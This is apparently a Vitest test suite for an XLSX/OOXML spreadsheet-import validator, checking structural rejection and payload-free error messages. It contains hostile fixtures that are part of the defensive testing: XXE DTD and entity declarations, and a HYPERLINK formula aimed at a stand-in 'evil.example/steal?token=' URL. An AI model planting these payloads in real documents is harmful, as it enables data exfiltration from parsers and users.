/** @vitest-environment node */

import { afterEach, describe, expect, it, vi } from "vitest";

import { DOCUMENT_MAX_BYTES } from "@/lib/orgs/document-types";
import {
  DocumentValidationError,
  validateDocument,
} from "@/lib/orgs/document-validation";
import { offeringDraftContentSchema } from "@/lib/orgs/offering-validation";
import {
  TabularValidationError,
  validateTabularImport,
} from "@/lib/orgs/tabular-validation";
import {
  CSV_MIME,
  XLSX_MIME,
  csvBytes,
  makeXlsx,
  prefixedWorkbookContentTypesXml,
  sampleCsv,
  sampleXlsx,
} from "@/tests/helpers/tabular-fixtures";

const SECRET = "SECRET_TOKEN_VALUE_42";
const EVIL_URL = "https://evil.example/steal?token=SECRET_TOKEN_VALUE_42";
const CT_NS = "http://schemas.openxmlformats.org/package/2006/content-types";
const SML_NS = "http://schemas.openxmlformats.org/spreadsheetml/2006/main";
const REL_NS = "http://schemas.openxmlformats.org/package/2006/relationships";
const OFFICE_REL_NS =
  "http://schemas.openxmlformats.org/officeDocument/2006/relationships";
const WORKBOOK_MAIN =
  "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml";
const WORKSHEET_TYPE =
  "application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml";
const SST_TYPE =
  "application/vnd.openxmlformats-officedocument.spreadsheetml.sharedStrings+xml";
const WORKSHEET_REL = `${OFFICE_REL_NS}/worksheet`;

type ConsumedPart =
  "contentTypes" | "workbook" | "rels" | "worksheet" | "sharedStrings";

const PART_PATH: Record<ConsumedPart, string> = {
  contentTypes: "[Content_Types].xml",
  workbook: "xl/workbook.xml",
  rels: "xl/_rels/workbook.xml.rels",
  worksheet: "xl/worksheets/sheet1.xml",
  sharedStrings: "xl/sharedStrings.xml",
};

afterEach(() => {
  vi.restoreAllMocks();
  vi.unstubAllGlobals();
});

describe("XLSX OOXML structural validation", () => {
  it("accepts default-namespace, prefixed, comment, PI, CDATA, and fixture workbooks", async () => {
    const ordinary = await validateTabularImport({
      bytes: await sampleXlsx(),
      filename: "ordinary.xlsx",
      declaredMimeType: XLSX_MIME,
    });
    expect(ordinary.outcome).toBe("ready");

    const defaultNs = await validateTabularImport({
      bytes: await xlsxWithPart("contentTypes", validContentTypes()),
      filename: "default-ns.xlsx",
      declaredMimeType: XLSX_MIME,
    });
    expect(defaultNs.outcome).toBe("ready");
    expect(defaultNs.previewRows).toEqual([
      { sourceRowNumber: 2, cells: ["Widget"] },
    ]);

    const prefixed = await validateTabularImport({
      bytes: await makeXlsx({
        sheets: [{ name: "Sheet1", rows: [["Name"], ["Widget"]] }],
        contentTypesXml: prefixedWorkbookContentTypesXml(),
        extras: {
          "xl/workbook.xml": prefixedWorkbook(),
          "xl/_rels/workbook.xml.rels": prefixedRels(),
          "xl/worksheets/sheet1.xml": prefixedWorksheet(),
          "xl/sharedStrings.xml": prefixedSharedStrings(),
        },
      }),
      filename: "prefixed-ooxml.xlsx",
      declaredMimeType: XLSX_MIME,
    });
    expect(prefixed.outcome).toBe("ready");
    expect(prefixed.previewRows).toEqual([
      { sourceRowNumber: 2, cells: ["Widget"] },
    ]);

    const markup = await validateTabularImport({
      bytes: await makeXlsx({
        sheets: [{ name: "Sheet1", rows: [["Name"], ["Widget"]] }],
        extras: {
          "[Content_Types].xml": `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!-- safe -->
<?pi safe ?>
<Types xmlns="${CT_NS}">
  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Default Extension="xml" ContentType="application/xml"/>
  <Override PartName="/xl/workbook.xml" ContentType="${WORKBOOK_MAIN}"/>
  <Override PartName="/xl/worksheets/sheet1.xml" ContentType="${WORKSHEET_TYPE}"/>
  <Override PartName="/xl/sharedStrings.xml" ContentType="${SST_TYPE}"/>
</Types>
<!-- trailing -->`,
          "xl/worksheets/sheet1.xml": `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<worksheet xmlns="${SML_NS}">
  <?pi ignore ?>
  <sheetData>
    <row r="1"><c r="A1" t="inlineStr"><is><t>Name</t></is></c></row>
    <row r="2"><c r="A2" t="inlineStr"><is><t><![CDATA[<Price>&more]]></t></is></c></row>
  </sheetData>
</worksheet>`,
        },
      }),
      filename: "cdata-comments.xlsx",
      declaredMimeType: XLSX_MIME,
    });
    expect(markup.outcome).toBe("ready");
    expect(markup.previewRows).toEqual([
      { sourceRowNumber: 2, cells: ["<Price>&more"] },
    ]);
  });

  it.each(structuralCases())("rejects $title", async ({ part, xml }) => {
    await expectMalformed(
      await xlsxWithPart(part, xml),
      `${part}-malformed.xlsx`,
    );
  });

  it("rejects rootless fragments that previously produced a ready preview", async () => {
    const fragments: Array<{
      part: ConsumedPart;
      xml: string;
      filename: string;
    }> = [
      {
        part: "workbook",
        filename: "rootless-sheets.xlsx",
        xml: `<sheets xmlns="${SML_NS}" xmlns:r="${OFFICE_REL_NS}">
  <sheet name="Sheet1" sheetId="1" r:id="rId1"/>
</sheets>`,
      },
      {
        part: "rels",
        filename: "rootless-relationship.xlsx",
        xml: `<Relationship Id="rId1" Type="${WORKSHEET_REL}" Target="worksheets/sheet1.xml"/>`,
      },
      {
        part: "contentTypes",
        filename: "rootless-override.xlsx",
        xml: `<Override PartName="/xl/workbook.xml" ContentType="${WORKBOOK_MAIN}"/>`,
      },
      {
        part: "worksheet",
        filename: "rootless-sheetdata.xlsx",
        xml: `<sheetData xmlns="${SML_NS}">
  <row r="1"><c r="A1" t="inlineStr"><is><t>Name</t></is></c></row>
  <row r="2"><c r="A2" t="inlineStr"><is><t>Widget</t></is></c></row>
</sheetData>`,
      },
      {
        part: "sharedStrings",
        filename: "rootless-si.xlsx",
        xml: `<si xmlns="${SML_NS}"><t>Name</t></si><si><t>Widget</t></si>`,
      },
    ];

    for (const fragment of fragments) {
      const bytes = await xlsxWithPart(fragment.part, fragment.xml);
      await expect(
        validateTabularImport({
          bytes,
          filename: fragment.filename,
          declaredMimeType: XLSX_MIME,
        }),
      ).rejects.toMatchObject({ code: "malformed" });
    }
  });

  it("does not treat comment, CDATA, or PI payloads as structural workbook data", async () => {
    await expect(
      validateTabularImport({
        bytes: await xlsxWithPart(
          "contentTypes",
          `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="${CT_NS}">
  <!-- <Override PartName="/xl/workbook.xml" ContentType="${WORKBOOK_MAIN}"/> -->
  <![CDATA[<Override PartName="/xl/workbook.xml" ContentType="${WORKBOOK_MAIN}"/>]]>
  <?pi <Override PartName="/xl/workbook.xml" ContentType="${WORKBOOK_MAIN}"/> ?>
  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Default Extension="xml" ContentType="application/xml"/>
  <Override PartName="/xl/worksheets/sheet1.xml" ContentType="${WORKSHEET_TYPE}"/>
</Types>`,
        ),
        filename: "fake-override.xlsx",
        declaredMimeType: XLSX_MIME,
      }),
    ).rejects.toMatchObject({ code: "type_mismatch" });

    const emptySheet = await validateTabularImport({
      bytes: await xlsxWithPart(
        "worksheet",
        `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<worksheet xmlns="${SML_NS}">
  <sheetData>
    <!-- <c r="A1" t="inlineStr"><is><t>${SECRET}</t></is></c> -->
    <![CDATA[<c r="A2"><f>HYPERLINK("${EVIL_URL}","1")</f></c>]]>
    <?pi <mergeCell ref="A1:Z1"/> ?>
  </sheetData>
</worksheet>`,
      ),
      filename: "fake-sheetdata.xlsx",
      declaredMimeType: XLSX_MIME,
    });
    expect(emptySheet.outcome).toBe("needs_attention");
    expect(emptySheet.previewRows).toEqual([]);
    expect(emptySheet.selectedSheet).toBeNull();
    expect(JSON.stringify(emptySheet)).not.toContain(SECRET);
    expect(JSON.stringify(emptySheet)).not.toContain(EVIL_URL);
    expect(
      emptySheet.issues.some(
        (item) =>
          item.code === "empty_sheet" || item.code === "no_usable_sheet",
      ),
    ).toBe(true);
  });

  it("reserves type_mismatch for a valid content-types document with the wrong workbook binding", async () => {
    await expect(
      validateTabularImport({
        bytes: await xlsxWithPart(
          "contentTypes",
          validContentTypes().replace(WORKBOOK_MAIN, "application/xml"),
        ),
        filename: "misbound-types.xlsx",
        declaredMimeType: XLSX_MIME,
      }),
    ).rejects.toMatchObject({ code: "type_mismatch" });
  });

  it("does not fetch external URLs and keeps malformed errors payload-free", async () => {
    const fetchSpy = vi.fn();
    vi.stubGlobal("fetch", fetchSpy);
    try {
      await validateTabularImport({
        bytes: await xlsxWithPart(
          "workbook",
          insertAfterXmlDecl(
            validWorkbook(),
            `<!DOCTYPE workbook SYSTEM "${EVIL_URL}">`,
          ),
        ),
        filename: "dtd.xlsx",
        declaredMimeType: XLSX_MIME,
      });
      expect.unreachable();
    } catch (caught) {
      expect(caught).toBeInstanceOf(TabularValidationError);
      expect(caught).toMatchObject({ code: "malformed" });
      const text = `${(caught as Error).message}\n${String(caught)}\n${JSON.stringify(caught)}`;
      expect(text).not.toContain(SECRET);
      expect(text).not.toContain(EVIL_URL);
      expect(text).not.toContain("Widget");
      expect(text).not.toContain("HYPERLINK");
    }
    expect(fetchSpy).not.toHaveBeenCalled();
  });

  it("does not change CSV, Phase 4B document, or Phase 4C offering validation", async () => {
    const csv = await validateTabularImport({
      bytes: csvBytes(sampleCsv()),
      filename: "offers.csv",
      declaredMimeType: CSV_MIME,
    });
    expect(csv.outcome).toBe("ready");
    expect(csv.kind).toBe("csv");

    await expect(
      validateDocument({
        bytes: csvBytes(sampleCsv()),
        filename: "offers.csv",
        declaredMimeType: CSV_MIME,
      }),
    ).rejects.toBeInstanceOf(DocumentValidationError);
    await expect(
      validateDocument({
        bytes: await sampleXlsx(),
        filename: "offers.xlsx",
        declaredMimeType: XLSX_MIME,
      }),
    ).rejects.toMatchObject({ code: "unsupported_type" });
    await expect(
      validateDocument({
        bytes: new TextEncoder().encode("Returns are accepted within 30 days."),
        filename: "policy.txt",
        declaredMimeType: "text/plain",
      }),
    ).resolves.toMatchObject({ kind: "txt" });
    await expect(
      validateDocument({
        bytes: new Uint8Array(DOCUMENT_MAX_BYTES + 1),
        filename: "large.txt",
        declaredMimeType: "text/plain",
      }),
    ).rejects.toMatchObject({ code: "too_large" });
    expect(
      offeringDraftContentSchema.safeParse({
        name: "Premium plan",
        offeringType: "PLAN",
        pricingModel: "RECURRING",
        prices: [
          {
            amount: "49.00",
            currencyCode: "CAD",
            billingFrequency: "MONTHLY",
          },
        ],
      }).success,
    ).toBe(true);
  });
});

function structuralCases(): Array<{
  title: string;
  part: ConsumedPart;
  xml: string;
}> {
  const parts: Array<{
    part: ConsumedPart;
    valid: () => string;
    rootLocalName: string;
    namespace: string;
    otherRoot: string;
    otherNamespace: string;
    rootless: string;
    incorrectParent: string;
    duplicateContainer: string;
    fakeMarkup: string;
  }> = [
    {
      part: "contentTypes",
      valid: validContentTypes,
      rootLocalName: "Types",
      namespace: CT_NS,
      otherRoot: "Relationships",
      otherNamespace: REL_NS,
      rootless: `<Override PartName="/xl/workbook.xml" ContentType="${WORKBOOK_MAIN}"/>`,
      incorrectParent: `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="${CT_NS}">
  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Default Extension="xml" ContentType="application/xml"/>
  <Wrapper>
    <Override PartName="/xl/workbook.xml" ContentType="${WORKBOOK_MAIN}"/>
  </Wrapper>
  <Override PartName="/xl/worksheets/sheet1.xml" ContentType="${WORKSHEET_TYPE}"/>
  <Override PartName="/xl/sharedStrings.xml" ContentType="${SST_TYPE}"/>
</Types>`,
      duplicateContainer: `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="${CT_NS}">
  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Default Extension="xml" ContentType="application/xml"/>
  <Override PartName="/xl/workbook.xml" ContentType="${WORKBOOK_MAIN}"/>
  <Override PartName="/xl/workbook.xml" ContentType="${WORKBOOK_MAIN}"/>
  <Override PartName="/xl/worksheets/sheet1.xml" ContentType="${WORKSHEET_TYPE}"/>
  <Override PartName="/xl/sharedStrings.xml" ContentType="${SST_TYPE}"/>
</Types>`,
      fakeMarkup: `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="${CT_NS}">
  <!-- <Override PartName="/xl/workbook.xml" ContentType="application/xml"/> -->
  <![CDATA[<Override PartName="/xl/workbook.xml" ContentType="application/xml"/>]]>
  <?pi <Override PartName="/xl/workbook.xml" ContentType="application/xml"/> ?>
  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Default Extension="xml" ContentType="application/xml"/>
  <Override PartName="/xl/worksheets/sheet1.xml" ContentType="${WORKSHEET_TYPE}"/>
</Types>`,
    },
    {
      part: "workbook",
      valid: validWorkbook,
      rootLocalName: "workbook",
      namespace: SML_NS,
      otherRoot: "Types",
      otherNamespace: CT_NS,
      rootless: `<sheets xmlns="${SML_NS}" xmlns:r="${OFFICE_REL_NS}"><sheet name="Sheet1" sheetId="1" r:id="rId1"/></sheets>`,
      incorrectParent: `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<workbook xmlns="${SML_NS}" xmlns:r="${OFFICE_REL_NS}">
  <sheet name="Sheet1" sheetId="1" r:id="rId1"/>
</workbook>`,
      duplicateContainer: `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<workbook xmlns="${SML_NS}" xmlns:r="${OFFICE_REL_NS}">
  <sheets><sheet name="Sheet1" sheetId="1" r:id="rId1"/></sheets>
  <sheets><sheet name="Other" sheetId="2" r:id="rId1"/></sheets>
</workbook>`,
      fakeMarkup: `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<workbook xmlns="${SML_NS}" xmlns:r="${OFFICE_REL_NS}">
  <!-- <sheet name="${SECRET}" sheetId="99" r:id="rId99"/> -->
  <![CDATA[<sheet name="${SECRET}" sheetId="98" r:id="rId98"/>]]>
  <?pi <sheet name="${SECRET}" sheetId="97" r:id="rId97"/> ?>
</workbook>`,
    },
    {
      part: "rels",
      valid: validRels,
      rootLocalName: "Relationships",
      namespace: REL_NS,
      otherRoot: "Types",
      otherNamespace: CT_NS,
      rootless: `<Relationship Id="rId1" Type="${WORKSHEET_REL}" Target="worksheets/sheet1.xml"/>`,
      incorrectParent: `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="${REL_NS}">
  <Wrapper>
    <Relationship Id="rId1" Type="${WORKSHEET_REL}" Target="worksheets/sheet1.xml"/>
  </Wrapper>
</Relationships>`,
      duplicateContainer: `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="${REL_NS}">
  <Relationships>
    <Relationship Id="rId1" Type="${WORKSHEET_REL}" Target="worksheets/sheet1.xml"/>
  </Relationships>
</Relationships>`,
      fakeMarkup: `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="${REL_NS}">
  <!-- <Relationship Id="rId99" Type="${WORKSHEET_REL}" Target="${EVIL_URL}"/> -->
  <![CDATA[<Relationship Id="rId98" Type="${WORKSHEET_REL}" Target="${EVIL_URL}"/>]]>
  <?pi <Relationship Id="rId97" Type="${WORKSHEET_REL}" Target="${EVIL_URL}"/> ?>
</Relationships>`,
    },
    {
      part: "worksheet",
      valid: validWorksheet,
      rootLocalName: "worksheet",
      namespace: SML_NS,
      otherRoot: "workbook",
      otherNamespace: CT_NS,
      rootless: `<sheetData xmlns="${SML_NS}">
  <row r="1"><c r="A1" t="inlineStr"><is><t>Name</t></is></c></row>
  <row r="2"><c r="A2" t="inlineStr"><is><t>Widget</t></is></c></row>
</sheetData>`,
      incorrectParent: `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<worksheet xmlns="${SML_NS}">
  <row r="1"><c r="A1" t="inlineStr"><is><t>Name</t></is></c></row>
  <sheetData>
    <row r="2"><c r="A2" t="inlineStr"><is><t>Widget</t></is></c></row>
  </sheetData>
</worksheet>`,
      duplicateContainer: `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<worksheet xmlns="${SML_NS}">
  <sheetData>
    <row r="1"><c r="A1" t="inlineStr"><is><t>Name</t></is></c></row>
  </sheetData>
  <sheetData>
    <row r="2"><c r="A2" t="inlineStr"><is><t>Widget</t></is></c></row>
  </sheetData>
</worksheet>`,
      fakeMarkup: `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<worksheet xmlns="${SML_NS}">
  <sheetData>
    <!-- <c r="A1" t="inlineStr"><is><t>${SECRET}</t></is></c> -->
    <![CDATA[<c r="A2"><f>HYPERLINK("${EVIL_URL}","1")</f></c>]]>
    <?pi <mergeCell ref="A1:Z1"/> ?>
  </sheetData>
</worksheet>`,
    },
    {
      part: "sharedStrings",
      valid: validSharedStrings,
      rootLocalName: "sst",
      namespace: SML_NS,
      otherRoot: "worksheet",
      otherNamespace: CT_NS,
      rootless: `<si xmlns="${SML_NS}"><t>Name</t></si>`,
      incorrectParent: `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<sst xmlns="${SML_NS}" count="2" uniqueCount="2">
  <wrapper><si><t>Name</t></si></wrapper>
  <si><t>Widget</t></si>
</sst>`,
      duplicateContainer: `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<sst xmlns="${SML_NS}">
  <sst>
    <si><t>Name</t></si>
    <si><t>Widget</t></si>
  </sst>
</sst>`,
      fakeMarkup: `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<sst xmlns="${SML_NS}" count="0" uniqueCount="0">
  <!-- <si><t>${SECRET}</t></si> -->
  <![CDATA[<si><t>${SECRET}</t></si>]]>
  <?pi <si><t>${EVIL_URL}</t></si> ?>
</sst>`,
    },
  ];

  const cases: Array<{ title: string; part: ConsumedPart; xml: string }> = [];
  for (const part of parts) {
    const valid = part.valid();
    cases.push({
      title: `${part.part} rootless fragment`,
      part: part.part,
      xml: part.rootless,
    });
    cases.push({
      title: `${part.part} incorrect root element`,
      part: part.part,
      xml: valid.replace(
        new RegExp(`<(/?)${part.rootLocalName}\\b`, "g"),
        `<$1${part.otherRoot}`,
      ),
    });
    cases.push({
      title: `${part.part} incorrect root namespace`,
      part: part.part,
      xml: valid.replace(part.namespace, part.otherNamespace),
    });
    cases.push({
      title: `${part.part} multiple document roots`,
      part: part.part,
      xml: `${valid}<${part.rootLocalName} xmlns="${part.namespace}"/>`,
    });
    cases.push({
      title: `${part.part} mismatched closing tag`,
      part: part.part,
      xml: valid.replace(
        new RegExp(`</${part.rootLocalName}>\\s*$`),
        `</${part.otherRoot}>`,
      ),
    });
    cases.push({
      title: `${part.part} invalid element nesting`,
      part: part.part,
      xml: nestInvalidly(valid, part.rootLocalName),
    });
    cases.push({
      title: `${part.part} truncated document`,
      part: part.part,
      xml: valid.slice(0, Math.max(40, valid.length - 32)),
    });
    cases.push({
      title: `${part.part} non-whitespace content after the root`,
      part: part.part,
      xml: `${valid}<extra/>`,
    });
    cases.push({
      title: `${part.part} expected element under an incorrect parent`,
      part: part.part,
      xml: part.incorrectParent,
    });
    cases.push({
      title: `${part.part} duplicate required structural container`,
      part: part.part,
      xml: part.duplicateContainer,
    });
    cases.push({
      title: `${part.part} DTD declaration`,
      part: part.part,
      xml: insertAfterXmlDecl(
        valid,
        `<!DOCTYPE ${part.rootLocalName} SYSTEM "${EVIL_URL}">`,
      ),
    });
    cases.push({
      title: `${part.part} entity declaration`,
      part: part.part,
      xml: insertAfterXmlDecl(
        valid,
        `<!DOCTYPE ${part.rootLocalName} [<!ENTITY x SYSTEM "${EVIL_URL}">]>`,
      ),
    });
    if (part.part !== "contentTypes" && part.part !== "worksheet") {
      cases.push({
        title: `${part.part} fake workbook elements in comments, CDATA, and PIs`,
        part: part.part,
        xml: part.fakeMarkup,
      });
    }
  }
  return cases;
}

async function expectMalformed(
  bytes: Uint8Array,
  filename: string,
): Promise<void> {
  const fetchSpy = vi.fn();
  vi.stubGlobal("fetch", fetchSpy);
  try {
    await validateTabularImport({
      bytes,
      filename,
      declaredMimeType: XLSX_MIME,
    });
    expect.unreachable();
  } catch (caught) {
    expect(caught).toBeInstanceOf(TabularValidationError);
    expect(caught).toMatchObject({ code: "malformed" });
    const text = `${(caught as Error).message}\n${String(caught)}`;
    expect(text).not.toContain(SECRET);
    expect(text).not.toContain(EVIL_URL);
  }
  expect(fetchSpy).not.toHaveBeenCalled();
}

async function xlsxWithPart(
  part: ConsumedPart,
  xml: string,
): Promise<Uint8Array> {
  return makeXlsx({
    sheets: [{ name: "Sheet1", rows: [["Name"], ["Widget"]] }],
    extras: { [PART_PATH[part]]: xml },
  });
}

function insertAfterXmlDecl(xml: string, insertion: string): string {
  const match = /^<\?xml[^?]*\?>/.exec(xml);
  if (!match) {
    return `${insertion}${xml}`;
  }
  return `${match[0]}${insertion}${xml.slice(match[0].length)}`;
}

function nestInvalidly(xml: string, rootLocalName: string): string {
  const close = `</${rootLocalName}>`;
  const index = xml.lastIndexOf(close);
  if (index < 0) {
    return xml;
  }
  return `${xml.slice(0, index)}</not-${rootLocalName}>${close}`;
}

function validContentTypes(): string {
  return `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="${CT_NS}">
  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Default Extension="xml" ContentType="application/xml"/>
  <Override PartName="/xl/workbook.xml" ContentType="${WORKBOOK_MAIN}"/>
  <Override PartName="/xl/worksheets/sheet1.xml" ContentType="${WORKSHEET_TYPE}"/>
  <Override PartName="/xl/sharedStrings.xml" ContentType="${SST_TYPE}"/>
</Types>`;
}

function validWorkbook(): string {
  return `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<workbook xmlns="${SML_NS}" xmlns:r="${OFFICE_REL_NS}">
  <sheets><sheet name="Sheet1" sheetId="1" r:id="rId1"/></sheets>
</workbook>`;
}

function validRels(): string {
  return `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="${REL_NS}">
  <Relationship Id="rId1" Type="${WORKSHEET_REL}" Target="worksheets/sheet1.xml"/>
</Relationships>`;
}

function validWorksheet(): string {
  return `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<worksheet xmlns="${SML_NS}">
  <sheetData>
    <row r="1"><c r="A1" t="inlineStr"><is><t>Name</t></is></c></row>
    <row r="2"><c r="A2" t="inlineStr"><is><t>Widget</t></is></c></row>
  </sheetData>
</worksheet>`;
}

function validSharedStrings(): string {
  return `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<sst xmlns="${SML_NS}" count="2" uniqueCount="2">
  <si><t>Name</t></si>
  <si><t>Widget</t></si>
</sst>`;
}

function prefixedWorkbook(): string {
  return `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<x:workbook xmlns:x="${SML_NS}" xmlns:r="${OFFICE_REL_NS}">
  <x:sheets><x:sheet name="Sheet1" sheetId="1" r:id="rId1"/></x:sheets>
</x:workbook>`;
}

function prefixedRels(): string {
  return `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<p:Relationships xmlns:p="${REL_NS}">
  <p:Relationship Id="rId1" Type="${WORKSHEET_REL}" Target="worksheets/sheet1.xml"/>
</p:Relationships>`;
}

function prefixedWorksheet(): string {
  return `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<x:worksheet xmlns:x="${SML_NS}">
  <x:sheetData>
    <x:row r="1"><x:c r="A1" t="s"><x:v>0</x:v></x:c></x:row>
    <x:row r="2"><x:c r="A2" t="s"><x:v>1</x:v></x:c></x:row>
  </x:sheetData>
</x:worksheet>`;
}

function prefixedSharedStrings(): string {
  return `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<x:sst xmlns:x="${SML_NS}" count="2" uniqueCount="2">
  <x:si><x:t>Name</x:t></x:si>
  <x:si><x:t>Widget</x:t></x:si>
</x:sst>`;
}
